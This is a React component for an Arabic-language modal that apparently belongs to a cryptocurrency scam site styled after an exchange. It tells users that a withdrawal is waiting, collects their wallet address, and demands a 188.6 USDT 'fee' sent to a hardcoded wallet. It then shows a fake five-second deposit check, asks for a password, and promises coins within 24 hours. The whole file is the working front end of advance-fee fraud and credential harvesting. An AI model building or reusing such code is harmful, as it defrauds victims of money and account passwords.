
import React, { useState, useEffect } from 'react';

interface MultiStepModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const MultiStepModal: React.FC<MultiStepModalProps> = ({ isOpen }) => {
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState({
    platformLink: '',
    bep20Address: '',
    password: ''
  });

  // تأثير خاص للخطوة 4 (الانتظار لمدة 5 ثوانٍ)
  useEffect(() => {
    if (step === 4) {
      const timer = setTimeout(() => {
        setStep(5);
      }, 5000);
      return () => clearTimeout(timer);
    }
  }, [step]);

  if (!isOpen) return null;

  const handleNext = () => setStep(step + 1);

  const renderStep = () => {
    switch (step) {
      case 1:
        return (
          <div className="space-y-4">
            <p className="text-[15px] leading-relaxed text-right">
              أهلاً بك <span className="text-[#f0b90b] font-bold">A5VSVP5CH000</span> تم تسوية حسابك <span className="font-bold">optcoin</span> وسيتم فتح قناة السحب. 
              اتبع التعليمات وقم بوضع رابط المنصة <span className="text-[#f0b90b]">mini pro</span> لقسم الإيداع حصراً.
            </p>
            <input
              type="text"
              placeholder="رابط المنصة mini pro"
              className="w-full bg-[#2b2f36] border border-[#474d57] rounded-lg p-3 text-sm focus:border-[#f0b90b] outline-none transition-colors text-right text-white"
              value={formData.platformLink}
              onChange={(e) => setFormData({ ...formData, platformLink: e.target.value })}
            />
            <button
              onClick={handleNext}
              disabled={!formData.platformLink}
              className="w-full bg-[#f0b90b] text-black font-bold py-3 rounded-lg hover:bg-[#e2ad0a] transition-colors disabled:opacity-50"
            >
              التالي
            </button>
          </div>
        );
      case 2:
        return (
          <div className="space-y-4">
            <p className="text-[15px] text-right">يرجى إدخال عنوان محفظة BEP-20 الخاصة بك:</p>
            <input
              type="text"
              placeholder="رابط محفظة BEP-20"
              className="w-full bg-[#2b2f36] border border-[#474d57] rounded-lg p-3 text-sm focus:border-[#f0b90b] outline-none transition-colors text-right text-white"
              value={formData.bep20Address}
              onChange={(e) => setFormData({ ...formData, bep20Address: e.target.value })}
            />
            <button
              onClick={handleNext}
              disabled={!formData.bep20Address}
              className="w-full bg-[#f0b90b] text-black font-bold py-3 rounded-lg hover:bg-[#e2ad0a] transition-colors disabled:opacity-50"
            >
              التالي
            </button>
          </div>
        );
      case 3:
        return (
          <div className="space-y-4">
            <p className="text-[14px] leading-relaxed text-right">
              أهلاً بك <span className="text-[#f0b90b] font-bold">A5VSVP5CH000</span> بقي أمر إيداع مبلغ <span className="font-bold text-[#f0b90b]">188.6 USDT (BEP-20)</span> لفتح قناة السحب.
            </p>
            <p className="text-[12px] text-[#848e9c] text-right bg-[#1e2329] p-3 rounded border border-[#2b2f36]">
              هذه الضريبة هي أجور منصتنا وليس لها أي صلة بمنصة mini pro.
            </p>
            <div className="bg-[#0b0e11] p-3 rounded-lg border border-[#f0b90b]/30 break-all">
              <p className="text-[11px] text-[#848e9c] mb-1 text-right">عنوان المحفظة للتحويل:</p>
              <p className="text-[13px] font-mono text-center text-[#f0b90b] select-all">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</p>
            </div>
            <button
              onClick={handleNext}
              className="w-full bg-[#f0b90b] text-black font-bold py-3 rounded-lg hover:bg-[#e2ad0a] transition-colors"
            >
              تم الإيداع
            </button>
          </div>
        );
      case 4:
        return (
          <div className="py-10 flex flex-col items-center space-y-5 animate-pulse">
            <div className="relative">
              <div className="w-14 h-14 border-4 border-[#f0b90b]/20 rounded-full"></div>
              <div className="absolute top-0 w-14 h-14 border-4 border-[#f0b90b] border-t-transparent rounded-full animate-spin"></div>
            </div>
            <div className="text-center space-y-1">
              <p className="text-[17px] font-bold">جارٍ التأكد من عملية الإيداع...</p>
              <p className="text-[12px] text-[#848e9c]">يرجى عدم إغلاق هذه الصفحة</p>
            </div>
          </div>
        );
      case 5:
        return (
          <div className="space-y-5">
            <div className="flex flex-col items-center mb-2">
               <div className="bg-[#0ecb81]/20 p-2 rounded-full mb-2">
                 <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0ecb81" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                   <polyline points="20 6 9 17 4 12" />
                 </svg>
               </div>
               <p className="text-[18px] font-bold text-[#0ecb81]">تم الإيداع، شكراً لك</p>
            </div>
            <div className="space-y-3">
              <p className="text-[14px] text-right">يرجى أدخل كلمة السر لإتمام السحب:</p>
              <input
                type="password"
                placeholder="كلمة السر"
                className="w-full bg-[#2b2f36] border border-[#474d57] rounded-lg p-3 text-sm focus:border-[#f0b90b] outline-none transition-colors text-right text-white"
                value={formData.password}
                onChange={(e) => setFormData({ ...formData, password: e.target.value })}
              />
              <button
                onClick={handleNext}
                disabled={!formData.password}
                className="w-full bg-[#f0b90b] text-black font-bold py-3 rounded-lg hover:bg-[#e2ad0a] transition-colors disabled:opacity-50"
              >
                التالي
              </button>
            </div>
          </div>
        );
      case 6:
        return (
          <div className="py-6 space-y-6 text-center">
            <div className="flex justify-center">
              <div className="bg-[#f0b90b]/10 p-4 rounded-full border-2 border-[#f0b90b]/30">
                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#f0b90b" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
                  <polyline points="22 4 12 14.01 9 11.01" />
                </svg>
              </div>
            </div>
            <div className="space-y-3">
              <p className="text-[20px] font-bold text-white">تم التأكيد بنجاح!</p>
              <p className="text-[15px] leading-relaxed text-[#848e9c]">
                سيتم مراجعة العملية وإرسال العملات إلى محفظتك خلال <span className="text-white font-bold">24 ساعة</span> القادمة.
              </p>
            </div>
            <div className="pt-4">
               <div className="bg-[#2b2f36] p-3 rounded-lg text-[12px] text-[#f0b90b] border border-[#f0b90b]/10">
                 حالة الطلب: قيد المعالجة
               </div>
            </div>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="fixed inset-0 z-[200] flex items-center justify-center p-6">
      <div className="absolute inset-0 bg-black/40"></div>
      
      <div className="relative w-full max-w-[340px] bg-[#1e2329] border border-[#2b2f36] rounded-2xl p-6 shadow-2xl text-white overflow-hidden">
        {renderStep()}
      </div>
    </div>
  );
};

export default MultiStepModal;
